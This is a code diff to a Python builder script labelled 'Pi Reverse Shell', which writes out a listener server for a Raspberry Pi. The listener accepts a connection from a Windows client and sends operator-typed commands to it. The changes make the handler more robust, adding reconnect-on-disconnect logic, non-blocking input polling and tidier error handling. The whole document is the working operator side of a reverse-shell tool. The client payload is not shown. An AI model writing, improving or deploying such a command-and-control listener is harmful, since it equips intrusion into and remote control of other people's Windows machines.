@@ -1,6 +1,7 @@
 import os
 import sys
 
+
 def main():
     print("=" * 52)
     print("  Pi Reverse Shell - Server Builder")
@@ -22,10 +23,13 @@ def main():
 import threading
 import sys
 import os
-import platform
+import select
 
 HOST = "0.0.0.0"
 PORT = {port}
+
+_disconnected = threading.Event()
+
 
 def receive_output(conn):
     try:
@@ -35,34 +39,55 @@ def receive_output(conn):
                 break
             sys.stdout.write(data.decode(errors="ignore"))
             sys.stdout.flush()
-    except:
+    except Exception:
         pass
+    finally:
+        _disconnected.set()
+
 
 def main():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind((HOST, PORT))
     server.listen(1)
-    print(f"[+] Waiting for Windows client on {{HOST}}:{{PORT}} ...")
 
     while True:
-        conn, addr = server.accept()
+        print(f"[+] Waiting for Windows client on {{HOST}}:{{PORT}} ...")
+        _disconnected.clear()
+
+        try:
+            conn, addr = server.accept()
+        except KeyboardInterrupt:
+            print("\\n[!] Server stopped.")
+            break
+
         print(f"[+] Windows client connected: {{addr}}")
         threading.Thread(target=receive_output, args=(conn,), daemon=True).start()
 
         try:
-            while True:
-                cmd = sys.stdin.readline()
-                if not cmd:
+            while not _disconnected.is_set():
+                readable, _, _ = select.select([sys.stdin], [], [], 0.5)
+                if _disconnected.is_set():
                     break
-                if cmd.lower().strip() == "cls":
-                    os.system("cls" if platform.system() == "Windows" else "clear")
-                    continue
-                conn.sendall(cmd.encode())
+                if readable:
+                    cmd = sys.stdin.readline()
+                    if not cmd:
+                        break
+                    if cmd.lower().strip() == "cls":
+                        os.system("clear")
+                        continue
+                    try:
+                        conn.sendall(cmd.encode())
+                    except Exception:
+                        break
         except KeyboardInterrupt:
-            print("\\n[!] Closing connection.")
-            conn.close()
-            break
+            print("\\n[!] Disconnecting client.")
+
+        conn.close()
+
+        if _disconnected.is_set():
+            print(f"\\n[!] Windows client {{addr}} disconnected. Waiting for reconnect...")
+
 
 if __name__ == "__main__":
     main()
@@ -83,6 +108,7 @@ if __name__ == "__main__":
     print(f"    2. Run on the Pi:  python server.py")
     print(f"    3. The server will listen on port {port} for the Windows client.")
     print()
+
 
 if __name__ == "__main__":
     main()
